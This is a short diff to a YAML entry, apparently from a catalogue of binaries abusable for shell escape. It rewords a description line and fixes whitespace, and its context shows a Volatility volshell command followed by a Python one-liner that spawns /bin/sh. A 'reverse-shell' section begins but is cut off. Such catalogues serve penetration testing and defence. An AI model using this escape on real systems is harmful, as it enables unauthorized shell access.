@@ -1,8 +1,8 @@
 ---
-description: The payloads are compatible with both Python version 2 and 3.
+description: The payloads should be compatible with both Python version 2 and 3.
 functions:
   shell:
-    - code: | 
+    - code: |
         ./volatility_2.6_lin64_standalone -f cridex.vmem --profile=WinXPSP2x86 volshell
         \_\_import\_\_("os").system("/bin/sh")
   reverse-shell:
